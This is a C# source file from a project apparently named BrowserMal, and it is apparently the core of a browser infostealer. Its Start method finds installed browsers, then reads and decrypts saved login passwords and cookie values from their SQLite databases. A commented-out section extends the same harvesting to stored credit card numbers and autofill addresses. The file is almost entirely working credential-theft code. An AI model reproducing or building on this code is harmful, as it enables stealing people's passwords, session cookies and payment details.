using BrowserMal.Browser;
using System.Collections.Generic;
using BrowserMal.Manager;
using BrowserMal.Model;

namespace BrowserMal
{
    public class Class1
    {
        private static readonly BrowserManager browserManager = new BrowserManager();

        public static void Start()
        {
            browserManager.Init();
            List<BrowserModel> browsers = browserManager.GetBrowsers();

            List<ColumnModel> credsColumns = new List<ColumnModel>
            {
                new ColumnModel("origin_url", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("username_value", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("password_value", isEncrypted: true, needsFormatting: false, isImportant: true)
            };

            GenericManager<CredentialModel> generic = new GenericManager<CredentialModel>("logins", new SqliteTableModel(credsColumns));
            generic.Init(ref browsers, Browser.Util.LOGIN_DATA);

            List<ColumnModel> cookiesColumns = new List<ColumnModel>
            {
                new ColumnModel("host_key", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("name", isEncrypted: false, needsFormatting: false, isImportant: true),
                new ColumnModel("path", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expires_utc", isEncrypted: false, needsFormatting: true, isImportant: false, Browser.Util.ChromiumToUnixTimestamp),
                new ColumnModel("encrypted_value", isEncrypted: true, needsFormatting: false, isImportant: true)
            };

            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns));
            cookiesManager.Init(ref browsers, Browser.Util.COOKIES);

            /*
            GenericManager<CreditCardModel> creditManager = new GenericManager<CreditCardModel>("credit_cards", new string[] 
            { 
                "name_on_card", 
                "expiration_month", 
                "expiration_year", 
                "nickname", 
                "card_number_encrypted" 
            }, true);
            creditManager.Init(ref browsers, Browser.Util.WEB_DATA);

            GenericManager<AddressesModel> addressesManager = new GenericManager<AddressesModel>("autofill_profiles", new string[]
            {
                "street_address",
                "city",
                "zipcode"
            }, false);
            addressesManager.Init(ref browsers, Browser.Util.WEB_DATA);*/
        }
    }
}
